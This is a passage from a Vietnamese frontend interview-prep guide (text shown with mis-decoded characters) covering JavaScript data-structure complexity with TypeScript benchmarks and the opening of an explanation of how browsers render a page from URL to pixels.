‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**üéØ Khi N√†o D√πng Observer N√†o?**

- **Intersection Observer**: Lazy loading, Infinite scroll, Visibility tracking
- **Resize Observer**: Responsive components, Charts, Dynamic layouts
- **Mutation Observer**: Auto-init elements, Debug DOM, Third-party integration

**‚úÖ T·ªïng K·∫øt:**

Observer APIs l√† c√¥ng c·ª• m·∫°nh m·∫Ω ƒë·ªÉ theo d√µi thay ƒë·ªïi DOM m·ªôt c√°ch hi·ªáu qu·∫£. Key takeaways:

1. **Hi·ªáu nƒÉng t·ªët h∆°n** event listeners truy·ªÅn th·ªëng
2. **B·∫•t ƒë·ªìng b·ªô** ‚Üí kh√¥ng block main thread
3. **C·∫ßn cleanup** ƒë√∫ng c√°ch ‚Üí tr√°nh memory leak
4. **Filter ch√≠nh x√°c** ‚Üí tr√°nh callback fire th·ª´a
5. **Debounce logic n·∫∑ng** ‚Üí tr√°nh performance issue

---
---
## 35. üìà Q35: ƒê·ªô Ph·ª©c T·∫°p Thu·∫≠t To√°n (Big O) - Map, Set, Array, Object  

**P1: T√™n c√¢u h·ªèi:** üìà Q35: ƒê·ªô Ph·ª©c T·∫°p Thu·∫≠t To√°n (Big O) - Map, Set, Array, Object  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Big O m√¥ t·∫£ performance khi data scale. Map/Set = O(1) average (hash table), Array = O(1) index access nh∆∞ng O(n) search, Object = O(1) property access."**

**üîë Performance Comparison:**

| **Operation** | **Map/Set** | **Object** | **Array** |
|--------------|------------|-----------|----------|
| **Access** | O(1) avg | O(1) | O(1) - index, O(n) - search |
| **Insert** | O(1) avg | O(1) | O(1) - end, O(n) - start/middle |
| **Delete** | O(1) avg | O(1) | O(1) - end, O(n) - start/middle |
| **Search** | O(1) - `.has()` | O(n) - loop keys | O(n) - `.indexOf()` |
| **Iterate** | O(n) | O(n) | O(n) |

**üîë Chi Ti·∫øt T·ª´ng C·∫•u Tr√∫c:**

**1. Map/Set - Hash Table (O(1) average):**
- **Internal**: Hash function ‚Üí bucket index ‚Üí direct access
- **Collision**: C√πng hash ‚Üí linked list/tree trong bucket
- **Average O(1)**: Hash function ph√¢n b·ªë ƒë·ªÅu ‚Üí √≠t collision
- **Worst O(n)**: T·∫•t c·∫£ keys c√πng hash (r·∫•t hi·∫øm)

**2. Object - Similar Map (O(1) average):**
- **Keys**: Ch·ªâ strings/symbols (Map d√πng any type)
- **Property access**: `obj.prop` ho·∫∑c `obj['prop']` ‚Üí O(1)
- **Search value**: Ph·∫£i loop `Object.values()` ‚Üí O(n)
- **Prototype chain**: Lookup theo chain n·∫øu kh√¥ng c√≥ own property

**3. Array - Contiguous Memory (mixed):**
- **Index access**: `arr[5]` ‚Üí O(1) (direct memory offset)
- **Search**: `.indexOf()`, `.includes()` ‚Üí **O(n)** (linear scan)
- **Push/pop** (end): O(1) - kh√¥ng shift
- **Unshift/shift** (start): **O(n)** - ph·∫£i shift t·∫•t c·∫£ elements
- **Splice** (middle): **O(n)** - shift elements sau insertion point

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- D√πng `array.indexOf()` trong loop ‚Üí O(n¬≤), d√πng Set cho O(n)
- `array.unshift()` nhi·ªÅu l·∫ßn ‚Üí O(n¬≤), d√πng `.push()` r·ªìi `.reverse()`
- Nghƒ© Object lookup **lu√¥n O(1)** ‚Üí Sai! Prototype chain c√≥ th·ªÉ O(k) v·ªõi k = chain depth
- D√πng `delete obj.key` trong hot path ‚Üí deoptimize V8, d√πng `obj.key = undefined` thay v√¨

**üí° Ki·∫øn Th·ª©c Senior:**
- **Map vs Object performance**: Map nhanh h∆°n cho **frequent add/delete** (Object shape changes ‚Üí deoptimize)
- **Set for uniqueness**: `[...new Set(arr)]` dedup = O(n), `arr.filter((v,i,a) => a.indexOf(v)===i)` = O(n¬≤)
- **Sparse arrays**: `arr[1000] = 1` t·∫°o holes ‚Üí ki·ªÉu d·ªØ li·ªáu thay ƒë·ªïi (dictionary mode), ch·∫≠m h∆°n
- **WeakMap/WeakSet**: O(1) nh∆∞ng kh√¥ng prevent GC, kh√¥ng iterable




**Tr·∫£ l·ªùi:****

- Kh√°i ni·ªám: Big O notation m√¥ t·∫£ hi·ªáu nƒÉng thu·∫≠t to√°n khi data tƒÉng l√™n; quan tr·ªçng ƒë·ªÉ ch·ªçn c·∫•u tr√∫c d·ªØ li·ªáu ph√π h·ª£p.
- Map/Set: O(1) average cho get/set/delete nh·ªù hash table; O(n) worst case khi hash collision nhi·ªÅu (r·∫•t hi·∫øm).
- Object: O(1) average cho property access; t∆∞∆°ng t·ª± Map nh∆∞ng ch·ªâ key string/symbol.
- Array: O(1) index access; O(n) search (indexOf, includes); O(n) insert/delete ƒë·∫ßu/gi·ªØa (ph·∫£i shift elements).

**Ho·∫°t ƒë·ªông Chi Ti·∫øt:**

**Map/Set - T·∫°i sao O(1)?**

1. **Hash Function**: Key ƒë∆∞·ª£c hash th√†nh index (0-buckets.length)
2. **Direct Access**: Truy c·∫≠p bucket qua index ‚Üí O(1)
3. **Collision Handling**: C√πng hash ‚Üí l∆∞u linked list/tree trong bucket
4. **Average Case**: √çt collision ‚Üí O(1); hash t·ªët ph√¢n b·ªë ƒë·ªÅu
5. **Worst Case**: Nhi·ªÅu collision ‚Üí O(n) (t·∫•t c·∫£ key c√πng bucket)

**Internal Structure:**

```
Map internal:
buckets: [
  0: null,
  1: { key: 'a', value: 1, next: { key: 'x', value: 2 } }, // Ch√∫ gi·∫£i: collision chain
  2: { key: 'b', value: 3 },
  ...
]

Hash('a') % buckets.length = 1 ‚Üí bucket[1]
Hash('x') % buckets.length = 1 ‚Üí collision ‚Üí chain v·ªõi 'a'
```

**∆Øu ƒëi·ªÉm:**

- Map/Set: O(1) thao t√°c, key c√≥ th·ªÉ l√† b·∫•t k·ª≥ type, maintain insertion order, c√≥ size property
- Object: Syntax ng·∫Øn g·ªçn, JSON serializable, prototype chain
- Array: O(1) index access, nhi·ªÅu built-in methods, maintain order

**Nh∆∞·ª£c ƒëi·ªÉm:**

- Map/Set: Syntax d√†i h∆°n Object, kh√¥ng serialize JSON tr·ª±c ti·∫øp, t·ªën memory h∆°n (hash table overhead)
- Object: Ch·ªâ string/symbol keys, kh√¥ng c√≥ size built-in, c√≥ th·ªÉ b·ªã prototype pollution
- Array: O(n) search/insert/delete (kh√¥ng ph·∫£i cu·ªëi m·∫£ng), memory fragmentation v·ªõi sparse array

**Ch√∫ th√≠ch:**

- D√πng Map khi c·∫ßn key kh√¥ng ph·∫£i string ho·∫∑c thao t√°c th√™m/x√≥a th∆∞·ªùng xuy√™n
- D√πng Object cho config/options ƒë∆°n gi·∫£n
- D√πng Array khi c·∫ßn maintain order v√† iterate nhi·ªÅu
- D√πng Set ƒë·ªÉ lo·∫°i duplicate O(1)

**Code Example:**

```ts
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: BIG O COMPARISON TABLE
 // Ch√∫ gi·∫£i: ============================================

/**
 * COMPLEXITY CHEAT SHEET:
 *
 * Operation           | Array      | Object     | Map        | Set
 * -------------------|------------|------------|------------|------------
 * Access by key/index | O(1)       | O(1)       | O(1)       | N/A
 * Search by value    | O(n)       | O(n)       | O(n)       | O(1)
 * Insert (end)       | O(1)*      | O(1)       | O(1)       | O(1)
 * Insert (start)     | O(n)       | O(1)       | O(1)       | O(1)
 * Delete             | O(n)       | O(1)       | O(1)       | O(1)
 * Iterate            | O(n)       | O(n)       | O(n)       | O(n)
 *
 * *Array push() amortized O(1) (resize khi c·∫ßn)
 */

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 1. MAP - O(1) ACCESS/INSERT/DELETE
 // Ch√∫ gi·∫£i: ============================================

const userMap = new Map<number, string>();

// Insert O(1) - hash key ‚Üí t√¨m bucket ‚Üí insert
console.time('Map insert 1M');
for (let i = 0; i < 1_000_000; i++) {
  userMap.set(i, `User${i}`); // Ch√∫ gi·∫£i: O(1) m·ªói l·∫ßn
}
console.timeEnd('Map insert 1M'); // Ch√∫ gi·∫£i: ~100-200ms

 // Ch√∫ gi·∫£i: Access O(1) - hash key ‚Üí direct bucket access
console.time('Map get');
const user = userMap.get(500_000); // Ch√∫ gi·∫£i: O(1)
console.timeEnd('Map get'); // Ch√∫ gi·∫£i: ~0.001ms

// Delete O(1) - hash key ‚Üí t√¨m bucket ‚Üí x√≥a
console.time('Map delete');
userMap.delete(500_000); // Ch√∫ gi·∫£i: O(1)
console.timeEnd('Map delete'); // Ch√∫ gi·∫£i: ~0.001ms

 // Ch√∫ gi·∫£i: Has O(1) - t∆∞∆°ng t·ª± get
console.log(userMap.has(500_000)); // Ch√∫ gi·∫£i: O(1)

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 2. SET - O(1) ADD/HAS/DELETE
 // Ch√∫ gi·∫£i: ============================================

const uniqueIds = new Set<number>();

 // Ch√∫ gi·∫£i: Add O(1) - hash value ‚Üí bucket ‚Üí check duplicate ‚Üí insert
console.time('Set add 1M');
for (let i = 0; i < 1_000_000; i++) {
  uniqueIds.add(i); // Ch√∫ gi·∫£i: O(1)
}
console.timeEnd('Set add 1M'); // Ch√∫ gi·∫£i: ~100-200ms

 // Ch√∫ gi·∫£i: Has O(1) - hash value ‚Üí check bucket
console.time('Set has');
const exists = uniqueIds.has(500_000); // Ch√∫ gi·∫£i: O(1)
console.timeEnd('Set has'); // Ch√∫ gi·∫£i: ~0.001ms

 // Ch√∫ gi·∫£i: Delete O(1)
uniqueIds.delete(500_000); // Ch√∫ gi·∫£i: O(1)

 // Ch√∫ gi·∫£i: Use case: Remove duplicates O(n)
const arrWithDupes = [1, 2, 2, 3, 3, 3, 4];
const unique = [...new Set(arrWithDupes)]; // Ch√∫ gi·∫£i: O(n) iterate + O(1) add = O(n) total
console.log(unique); // Ch√∫ gi·∫£i: [1, 2, 3, 4]

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 3. OBJECT - O(1) PROPERTY ACCESS
 // Ch√∫ gi·∫£i: ============================================

const userObj: Record<string, string> = {};

 // Ch√∫ gi·∫£i: Insert O(1) - hash key (string) ‚Üí bucket
console.time('Object insert 1M');
for (let i = 0; i < 1_000_000; i++) {
  userObj[`user${i}`] = `User${i}`; // Ch√∫ gi·∫£i: O(1)
}
console.timeEnd('Object insert 1M'); // ~150-250ms (ch·∫≠m h∆°n Map ch√∫t)

 // Ch√∫ gi·∫£i: Access O(1)
console.time('Object access');
const objUser = userObj['user500000']; // Ch√∫ gi·∫£i: O(1)
console.timeEnd('Object access'); // Ch√∫ gi·∫£i: ~0.001ms

 // Ch√∫ gi·∫£i: Delete O(1)
delete userObj['user500000']; // Ch√∫ gi·∫£i: O(1)

// ‚ö†Ô∏è Prototype chain: O(1) n·∫øu own property, O(k) n·∫øu trong chain (k = ƒë·ªô s√¢u)
console.log(userObj.toString); // O(k) - t√¨m trong prototype chain

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 4. ARRAY - MIXED COMPLEXITY
 // Ch√∫ gi·∫£i: ============================================

const arr: number[] = [];

// Push O(1) amortized (resize khi capacity ƒë·∫ßy)
console.time('Array push 1M');
for (let i = 0; i < 1_000_000; i++) {
  arr.push(i); // Ch√∫ gi·∫£i: O(1) average
}
console.timeEnd('Array push 1M'); // ~50-100ms (nhanh nh·∫•t v√¨ sequential memory)

 // Ch√∫ gi·∫£i: Access by index O(1) - direct memory offset
console.time('Array access');
const val = arr[500_000]; // Ch√∫ gi·∫£i: O(1)
console.timeEnd('Array access'); // Ch√∫ gi·∫£i: ~0.0001ms (nhanh nh·∫•t)

// Search O(n) - ph·∫£i iterate to√†n b·ªô
console.time('Array indexOf');
const idx = arr.indexOf(500_000); // Ch√∫ gi·∫£i: O(n) worst case
console.timeEnd('Array indexOf'); // Ch√∫ gi·∫£i: ~5-10ms

 // Ch√∫ gi·∫£i: Includes O(n)
console.time('Array includes');
const has = arr.includes(500_000); // Ch√∫ gi·∫£i: O(n)
console.timeEnd('Array includes'); // Ch√∫ gi·∫£i: ~5-10ms

 // Ch√∫ gi·∫£i: Unshift O(n) - ph·∫£i shift t·∫•t c·∫£ elements sang ph·∫£i
console.time('Array unshift');
arr.unshift(-1); // Ch√∫ gi·∫£i: O(n) - ph·∫£i move 1M elements
console.timeEnd('Array unshift'); // Ch√∫ gi·∫£i: ~50-100ms

// Shift O(n) - ph·∫£i shift t·∫•t c·∫£ elements sang tr√°i
console.time('Array shift');
arr.shift(); // Ch√∫ gi·∫£i: O(n)
console.timeEnd('Array shift'); // Ch√∫ gi·∫£i: ~50-100ms

 // Ch√∫ gi·∫£i: Splice O(n) - insert/delete ·ªü gi·ªØa
arr.splice(500_000, 1); // O(n) - ph·∫£i shift elements sau v·ªã tr√≠ x√≥a

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 5. PRACTICAL COMPARISON
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Scenario 1: Lookup by ID (frequent)
 // Ch√∫ gi·∫£i: ‚ùå Array - O(n) every time
const usersArr = [
  { id: 1, name: 'A' },
  { id: 2, name: 'B' },
 // Ch√∫ gi·∫£i: ... 1 million users
];
const user1 = usersArr.find((u) => u.id === 500_000); // Ch√∫ gi·∫£i: O(n) - ch·∫≠m!

 // Ch√∫ gi·∫£i: ‚úÖ Map - O(1)
const usersMap = new Map([
  [1, { id: 1, name: 'A' }],
  [2, { id: 2, name: 'B' }],
]);
const user2 = usersMap.get(500_000); // Ch√∫ gi·∫£i: O(1) - nhanh!

 // Ch√∫ gi·∫£i: Scenario 2: Check existence
 // Ch√∫ gi·∫£i: ‚ùå Array - O(n)
const tags = ['js', 'ts', 'react', 'vue'];
const hasReact = tags.includes('react'); // Ch√∫ gi·∫£i: O(n)

 // Ch√∫ gi·∫£i: ‚úÖ Set - O(1)
const tagSet = new Set(['js', 'ts', 'react', 'vue']);
const hasReact2 = tagSet.has('react'); // Ch√∫ gi·∫£i: O(1)

 // Ch√∫ gi·∫£i: Scenario 3: Remove duplicates
 // Ch√∫ gi·∫£i: ‚ùå Array - O(n¬≤) v·ªõi nested loop
function removeDupes(arr: number[]): number[] {
  const result: number[] = [];
  for (const item of arr) {
 // Ch√∫ gi·∫£i: O(n)
    if (!result.includes(item)) {
 // Ch√∫ gi·∫£i: O(n)
      result.push(item);
    }
  }
  return result; // Ch√∫ gi·∫£i: O(n¬≤) total
}

 // Ch√∫ gi·∫£i: ‚úÖ Set - O(n)
function removeDupesSet(arr: number[]): number[] {
  return [...new Set(arr)]; // Ch√∫ gi·∫£i: O(n) iterate + O(1) add = O(n)
}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 6. WHY MAP/SET ARE O(1) - VISUALIZATION
 // Ch√∫ gi·∫£i: ============================================

/**
 * HASH TABLE INTERNAL STRUCTURE:
 *
 * Hash Function: key ‚Üí hash code (number)
 * Bucket Index: hash % buckets.length
 *
 * Example: Map v·ªõi 8 buckets
 *
 * buckets = [
 *   0: null,
 *   1: Entry('apple', 5) ‚Üí null, // Ch√∫ gi·∫£i: No collision
 *   2: Entry('banana', 10) ‚Üí Entry('blueberry', 12) ‚Üí null, // Ch√∫ gi·∫£i: Collision!
 *   3: null,
 *   4: Entry('cherry', 8) ‚Üí null,
 *   5: null,
 *   6: null,
 *   7: null
 * ]
 *
 * GET OPERATION:
 * map.get('banana')
 * 1. hash('banana') = 18
 * 2. bucket_index = 18 % 8 = 2
 * 3. Go to buckets[2]
 * 4. Walk linked list: 'banana' === 'banana' ‚úì
 * 5. Return value: 10
 * ‚Üí O(1) average (chain ng·∫Øn)
 *
 * SET OPERATION:
 * map.set('grape', 15)
 * 1. hash('grape') = 10
 * 2. bucket_index = 10 % 8 = 2
 * 3. Collision v·ªõi 'banana' chain
 * 4. Append to chain end
 * ‚Üí O(1) average
 *
 * COLLISION RESOLUTION:
 * - Chaining: Linked list trong bucket
 * - Open Addressing: T√¨m bucket tr·ªëng k·∫ø ti·∫øp
 * - JS engines d√πng chaining + resize khi load factor cao
 */

 // Ch√∫ gi·∫£i: Minh h·ªça hash collision
class SimpleHashMap<K, V> {
  private buckets: Array<Array<{ key: K; value: V }>> = [];
  private size = 0;

  constructor(capacity = 16) {
    this.buckets = Array(capacity)
      .fill(null)
      .map(() => []);
  }

  private hash(key: K): number {
    const str = String(key);
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      hash = (hash << 5) - hash + str.charCodeAt(i);
      hash = hash & hash; // Ch√∫ gi·∫£i: Convert to 32-bit integer
    }
    return Math.abs(hash);
  }

  set(key: K, value: V): void {
    const index = this.hash(key) % this.buckets.length;
    const bucket = this.buckets[index];

 // Ch√∫ gi·∫£i: Check if key exists (update)
    for (const entry of bucket) {
      if (entry.key === key) {
        entry.value = value;
        return;
      }
    }

 // Ch√∫ gi·∫£i: New key (append to chain)
    bucket.push({ key, value });
    this.size++;
  }

  get(key: K): V | undefined {
    const index = this.hash(key) % this.buckets.length;
    const bucket = this.buckets[index];

 // Ch√∫ gi·∫£i: Walk chain O(k) where k = chain length (usually small)
    for (const entry of bucket) {
      if (entry.key === key) {
        return entry.value;
      }
    }

    return undefined;
  }

 // Ch√∫ gi·∫£i: Visualize buckets
  visualize(): void {
    this.buckets.forEach((bucket, idx) => {
      if (bucket.length > 0) {
        console.log(
          `Bucket ${idx}:`,
          bucket.map((e) => `${e.key}=${e.value}`).join(' ‚Üí ')
        );
      }
    });
  }
}

 // Ch√∫ gi·∫£i: Demo collision
const hashMap = new SimpleHashMap<string, number>(8);
hashMap.set('apple', 1);
hashMap.set('banana', 2);
hashMap.set('cherry', 3);
hashMap.visualize();
// Output s·∫Ω show collision n·∫øu hash('apple') % 8 === hash('banana') % 8
```

**Best Practices:**

1. **Ch·ªçn c·∫•u tr√∫c d·ªØ li·ªáu ph√π h·ª£p:**

   - Lookup th∆∞·ªùng xuy√™n ‚Üí Map/Object
   - Check existence ‚Üí Set
   - Ordered collection + iterate ‚Üí Array
   - Simple config ‚Üí Object

2. **Performance tips:**

   - D√πng Map thay Array.find() cho lookup nhi·ªÅu l·∫ßn
   - D√πng Set.has() thay Array.includes()
   - Avoid unshift/shift trong loop ‚Üí d√πng push + reverse
   - Pre-allocate Array size n·∫øu bi·∫øt tr∆∞·ªõc: `new Array(1000000)`

3. **Memory consideration:**

   - Map/Set t·ªën memory h∆°n (~2x overhead cho hash table)
   - Sparse array t·ªën memory th·ª´a
   - Object c√≥ prototype overhead

4. **Hash collision mitigation:**
   - JS engines t·ª± resize hash table khi load factor cao
   - Good hash function ph√¢n b·ªë ƒë·ªÅu keys
   - Modern engines d√πng advanced techniques (Robin Hood hashing, etc.)

**Mistakes:**

```ts
// ‚ùå Sai: D√πng Array.find() trong loop ‚Üí O(n¬≤)
const users = [
  /* 1M users */
];
const posts = [
  /* 1M posts */
];
posts.forEach((post) => {
  const author = users.find((u) => u.id === post.authorId); // Ch√∫ gi·∫£i: O(n) m·ªói l·∫ßn
  // Total: O(n¬≤) = 1 tri·ªáu * 1 tri·ªáu = 1,000 t·ª∑ operations üò±
});

// ‚úÖ ƒê√∫ng: Build Map tr∆∞·ªõc ‚Üí O(n)
const userMap = new Map(users.map((u) => [u.id, u])); // Ch√∫ gi·∫£i: O(n)
posts.forEach((post) => {
  const author = userMap.get(post.authorId); // Ch√∫ gi·∫£i: O(1)
  // Total: O(n) = 1 tri·ªáu operations ‚úÖ
});

// ‚ùå Sai: Check duplicate b·∫±ng includes ‚Üí O(n¬≤)
const unique: number[] = [];
arr.forEach((item) => {
  if (!unique.includes(item)) {
 // Ch√∫ gi·∫£i: O(n)
    unique.push(item);
  }
}); // Ch√∫ gi·∫£i: Total O(n¬≤)

// ‚úÖ ƒê√∫ng: D√πng Set ‚Üí O(n)
const unique2 = [...new Set(arr)]; // Ch√∫ gi·∫£i: O(n)

 // Ch√∫ gi·∫£i: ‚ùå Sai: Delete array items trong loop ‚Üí O(n¬≤)
for (let i = 0; i < arr.length; i++) {
  if (condition) {
    arr.splice(i, 1); // Ch√∫ gi·∫£i: O(n) - shift elements
    i--; // Ch√∫ gi·∫£i: adjust index
  }
} // Ch√∫ gi·∫£i: Total O(n¬≤)

// ‚úÖ ƒê√∫ng: Filter ‚Üí O(n)
const filtered = arr.filter((item) => !condition); // Ch√∫ gi·∫£i: O(n)
```

**K·∫øt Lu·∫≠n:**

- **Map/Set O(1)** nh·ªù hash table: hash key ‚Üí direct bucket access
- **Array O(1)** index access nh∆∞ng O(n) search/insert/delete
- **Object O(1)** property access, t∆∞∆°ng t·ª± Map nh∆∞ng key string/symbol only
- Ch·ªçn ƒë√∫ng data structure ‚Üí performance tƒÉng exponentially (O(n¬≤) ‚Üí O(n))
---
## 36. üåç Q36: T·ª´ URL ƒë·∫øn UI - Qu√° Tr√¨nh Browser Render M·ªôt Trang Web (Critical Rendering Path)  

**P1: T√™n c√¢u h·ªèi:** üåç Q36: T·ª´ URL ƒë·∫øn UI - Qu√° Tr√¨nh Browser Render M·ªôt Trang Web (Critical Rendering Path)  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"T·ª´ URL ‚Üí UI g·ªìm: Network (DNS, TCP, TLS, HTTP), Parsing (HTML ‚Üí DOM, CSS ‚Üí CSSOM), Rendering (Layout, Paint, Composite). Critical Rendering Path optimize = faster First Paint."**

**üîë 12 B∆∞·ªõc Ch√≠nh:**

**PHASE 1: NETWORK (~300-1000ms)**

**1. DNS Lookup** (~20-120ms):
- Resolve `example.com` ‚Üí IP address `93.184.216.34`
- Cache: Browser ‚Üí OS ‚Üí Router ‚Üí ISP DNS

**2. TCP Handshake** (~100-300ms):
- 3-way: SYN ‚Üí SYN-ACK ‚Üí ACK
- Thi·∫øt l·∫≠p k·∫øt n·ªëi gi·ªØa client-server

**3. TLS Handshake** (~100-300ms - n·∫øu HTTPS):
- Certificate verification, key exchange
- Encrypted connection setup

**4. HTTP Request/Response** (~50-500ms):
- Browser g·ª≠i GET request
- Server return HTML (+ headers: cache, encoding...)

**PHASE 2: PARSING (~50-200ms)**

**5. HTML Parsing ‚Üí DOM Tree:**
- Tokenize HTML ‚Üí parse tags ‚Üí construct DOM tree
- **Blocking**: `<script>` without `async/defer`

**6. CSS Parsing ‚Üí CSSOM Tree:**
- Parse CSS ‚Üí compute styles ‚Üí CSSOM tree
- **Render-blocking**: CSS blocks rendering

**7. JavaScript Execution:**
- Parser-blocking: `<script>` stops HTML parsing
- Execute JS ‚Üí modify DOM/CSSOM
- `async` = execute when downloaded, `defer` = execute after DOM

**PHASE 3: RENDERING (~100-500ms)**

**8. Render Tree Construction:**
- DOM + CSSOM ‚Üí **Render Tree** (ch·ªâ visible elements)
- Skip `display:none`, `<head>`, `<script>`

**9. Layout (Reflow):**
- T√≠nh to√°n **position & size** c·ªßa m·ªçi element
- Output: **Box Model** (width, height, x, y)

**10. Paint:**
- T·∫°o **paint records** (fill text, colors, images, borders...)
- Output: **Paint layers**

**11. Composite:**
- K·∫øt h·ª£p layers th√†nh final image
- GPU-accelerated (CSS transforms, opacity)

**12. Display:**
- Browser hi·ªÉn th·ªã pixels tr√™n m√†n h√¨nh

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- `<script>` ·ªü `<head>` kh√¥ng `async/defer` ‚Üí block HTML parsing
- CSS ·ªü cu·ªëi `<body>` ‚Üí **FOUC** (Flash of Unstyled Content)
- Large DOM (>1500 nodes) ‚Üí ch·∫≠m layout/paint
- Force sync layout (read `offsetHeight` ‚Üí modify style ‚Üí read again) ‚Üí **layout thrashing**

**üí° Ki·∫øn Th·ª©c Senior:**
- **Critical Rendering Path optimization**:
  - Minimize **render-blocking resources** (inline critical CSS, defer non-critical)
  - **Preload** key resources: `<link rel="preload" href="font.woff2">`
  - **HTTP/2 Server Push** critical assets
- **Metrics**: FCP (First Contentful Paint), LCP (Largest), TTI (Time to Interactive)
- **`will-change: transform`**: Hint browser t·∫°o composite layer tr∆∞·ªõc (optimize animations)
- **Resource Hints**: `dns-prefetch`, `preconnect`, `prefetch`, `prerender`




**Tr·∫£ l·ªùi:****

Khi user nh·∫≠p URL `https://example.com` v√† nh·∫•n Enter, c√≥ **12 b∆∞·ªõc ch√≠nh** x·∫£y ra:

**üåê PHASE 1: NETWORK (M·∫°ng) - L·∫•y t√†i nguy√™n t·ª´ server**

1. **DNS Lookup (Tra c·ª©u DNS)** - ~20-120ms

   - Browser ki·ªÉm tra DNS cache (browser ‚Üí OS ‚Üí router ‚Üí ISP)
   - N·∫øu kh√¥ng c√≥, query DNS server ƒë·ªÉ resolve `example.com` ‚Üí IP `93.184.216.34`
   - **Ch√∫ th√≠ch**: Gi·ªëng tra s·ªë ƒëi·ªán tho·∫°i trong danh b·∫° ƒë·ªÉ bi·∫øt ƒë·ªãa ch·ªâ nh√†

2. **TCP Handshake (B·∫Øt tay 3 b∆∞·ªõc)** - ~100-300ms

   - Client g·ª≠i `SYN` (synchronize) ‚Üí Server
   - Server g·ª≠i `SYN-ACK` (acknowledge) ‚Üí Client
   - Client g·ª≠i `ACK` ‚Üí Server
   - **K·∫øt n·ªëi TCP ƒë∆∞·ª£c thi·∫øt l·∫≠p**
   - **Ch√∫ th√≠ch**: Gi·ªëng 2 ng∆∞·ªùi g·ªçi ƒëi·ªán x√°c nh·∫≠n nghe th·∫•y nhau tr∆∞·ªõc khi n√≥i chuy·ªán

3. **TLS Handshake (N·∫øu HTTPS)** - ~100-300ms

   - Client g·ª≠i `ClientHello` (supported cipher suites)
   - Server g·ª≠i `ServerHello` + Certificate (SSL cert)
   - Client verify certificate v·ªõi CA (Certificate Authority)
   - Trao ƒë·ªïi keys v√† thi·∫øt l·∫≠p encrypted connection
   - **Ch√∫ th√≠ch**: Gi·ªëng ki·ªÉm tra CMND tr∆∞·ªõc khi chia s·∫ª th√¥ng tin m·∫≠t

4. **HTTP Request** - ~50-200ms

   ```http
   GET / HTTP/1.1
   Host: example.com
   User-Agent: Chrome/120.0
   Accept: text/html
   Accept-Encoding: gzip, deflate, br
   Cookie: session=abc123
   ```

   - Browser g·ª≠i request l√™n server
   - **Ch√∫ th√≠ch**: Gi·ªëng b·∫°n y√™u c·∫ßu m√≥n ƒÉn ·ªü nh√† h√†ng

5. **Server Processing** - ~100-1000ms

   - Server nh·∫≠n request
   - X·ª≠ l√Ω logic (query database, run business logic)
   - Generate HTML response
   - **Ch√∫ th√≠ch**: B·∫øp n·∫•u m√≥n ƒÉn b·∫°n y√™u c·∫ßu

6. **HTTP Response** - ~50-500ms

   ```http
   HTTP/1.1 200 OK
   Content-Type: text/html; charset=utf-8
   Content-Encoding: gzip
   Content-Length: 1234
   Cache-Control: max-age=3600

   <!DOCTYPE html>
   <html>...</html>
   ```

   - Server g·ª≠i HTML v·ªÅ browser
   - **Ch√∫ th√≠ch**: M√≥n ƒÉn ƒë∆∞·ª£c mang ra b√†n

**üé® PHASE 2: PARSING (Ph√¢n t√≠ch) - Browser x·ª≠ l√Ω HTML/CSS/JS**

7. **HTML Parsing ‚Üí DOM Tree** - ~100-500ms

   ```
   HTML: <div><p>Hello</p></div>

   DOM Tree:
   Document
   ‚îî‚îÄ‚îÄ html
       ‚îî‚îÄ‚îÄ body
           ‚îî‚îÄ‚îÄ div
               ‚îî‚îÄ‚îÄ p
                   ‚îî‚îÄ‚îÄ "Hello"
   ```

   - Browser parse HTML t·ª´ tr√™n xu·ªëng (top-to-bottom)
   - T·∫°o **DOM (Document Object Model)** tree
   - **‚ö†Ô∏è Blocking**: Khi g·∫∑p `<script>`, d·ª´ng parsing cho ƒë·∫øn khi script execute xong
   - **Ch√∫ th√≠ch**: ƒê·ªçc c√¥ng th·ª©c n·∫•u ƒÉn v√† chu·∫©n b·ªã nguy√™n li·ªáu

8. **CSS Parsing ‚Üí CSSOM Tree** - ~50-200ms

   ```
   CSS: div { color: red; }

   CSSOM Tree:
   StyleSheet
   ‚îî‚îÄ‚îÄ div
       ‚îî‚îÄ‚îÄ color: red
   ```

   - Parse `<link>` v√† `<style>` tags
   - T·∫°o **CSSOM (CSS Object Model)** tree
